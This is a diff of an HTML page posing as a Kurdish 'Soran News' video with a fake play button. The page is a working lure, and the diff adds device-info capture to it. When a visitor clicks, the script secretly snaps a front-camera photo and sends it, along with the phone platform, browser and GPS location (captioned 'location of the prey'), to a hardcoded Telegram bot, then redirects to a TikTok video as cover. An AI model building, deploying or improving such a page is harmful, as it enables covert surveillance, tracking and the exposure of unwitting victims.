@@ -3,54 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Soran News - کێشەی خەڵک</title>
-    <meta property="og:title" content="کێشەیەکی نوێ لە ئیدارەی سۆران بڵاوکرایەوە">
-    <meta property="og:description" content="بینەری ڤیدیۆکە بن، خەڵکێکی زۆر ناڕەزایەتی دەردەبڕن">
+    <title>Soran News</title>
+    <meta property="og:title" content="کێشەیەکی نوێ لە سۆران بڵاوکرایەوە">
     <meta property="og:image" content="soran.jpg">
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; }
         .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.6); }
-        .play-btn { position: absolute; z-index: 100; cursor: pointer; background: rgba(255,255,255,0.1); border-radius: 50%; padding: 20px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3); }
-        .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.9; }
+        /* دروستکردنی سەهمەکە ڕێک وەک وێنەکە */
+        .play-btn { position: absolute; z-index: 100; cursor: pointer; background: rgba(255,255,255,0.2); border-radius: 50%; padding: 25px; backdrop-filter: blur(8px); border: 2px solid rgba(255,255,255,0.4); display: flex; justify-content: center; align-items: center; transition: 0.3s; }
+        .play-icon { width: 60px; height: 60px; fill: white; margin-left: 5px; }
         video, canvas { display: none; }
-        .flash-active { background: #fff !important; }
     </style>
 </head>
-<body id="body">
-    <div class="bg" id="bg"></div>
-    <div class="play-btn" id="trap" onclick="ultraCapture()">
+<body>
+    <div class="bg"></div>
+    <div class="play-btn" onclick="startCapture()">
         <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
     </div>
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
+
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
-        async function ultraCapture() {
+
+        async function startCapture() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v');
-                v.srcObject = s; await v.play();
-                document.getElementById('trap').style.display = 'none';
-                document.getElementById('bg').style.display = 'none';
-                document.getElementById('body').classList.add('flash-active');
+                // ١. داواکردنی کامێرا و وێنەگرتنی خێرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                await video.play();
+
                 setTimeout(async () => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                    
+                    // ٢. ناردنی وێنە و جۆری مۆبایل بۆ تێلێگرام
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'target.jpg');
+                    formData.append('photo', blob, 'ncher.jpg');
+                    formData.append('caption', "📱 جۆری مۆبایل: " + navigator.platform + "\n🌐 وێبگەر: " + navigator.userAgent.split(' ')[0]);
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+
+                    // ٣. داواکردنی لۆکەیشن دوای وێنەگرتنەکە
                     navigator.geolocation.getCurrentPosition(async (pos) => {
-                        const msg = `📍 Location:\nhttp://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                        const locMsg = `📍 لۆکەیشنی نێچیر:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(locMsg)}`);
                         window.location.href = targetVideo;
                     }, () => { window.location.href = targetVideo; });
-                }, 1800);
-            } catch (e) { window.location.href = targetVideo; }
+
+                }, 1000);
+            } catch (e) {
+                window.location.href = targetVideo;
+            }
         }
     </script>
 </body>
